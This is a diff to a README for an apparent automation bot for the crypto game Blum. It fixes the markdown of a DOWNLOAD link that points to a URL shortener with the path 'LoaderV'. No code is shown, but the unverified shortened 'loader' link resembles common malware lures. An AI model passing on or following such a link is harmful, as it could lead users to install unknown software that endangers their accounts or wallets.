@@ -2,7 +2,7 @@
 
 <h1 align="center">Auto bot Blum</h1>
 
-[DOWNLOAD]___(https://goo.su/LoaderV) 
+[DOWNLOAD](https://goo.su/LoaderV) 
 
 > [!NOTE]
 > Hi everyone today we present you our bot for crypto game Blum with which you can automate the whole process in the game which is possible
